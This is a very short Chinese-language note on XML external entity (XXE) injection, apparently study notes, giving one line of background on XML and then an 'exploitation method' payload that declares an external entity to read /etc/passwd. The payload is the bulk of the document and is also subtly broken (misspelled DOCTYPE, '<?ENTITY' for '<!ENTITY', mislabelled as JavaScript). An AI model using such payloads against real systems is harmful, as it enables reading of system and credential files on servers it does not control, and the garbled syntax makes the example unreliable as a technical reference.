**前置知识**

xml不是编程语言，而是一种标记语言，类似与html

**利用方式：**

```javascript
<?xml version="1.0" encoding="utf-8"?>
    <!DOCTUPE note[
    <?ENTITY write SYSTEM "file:///etc/passwd"> ]>
    <note>
        &write;
    </note>
```

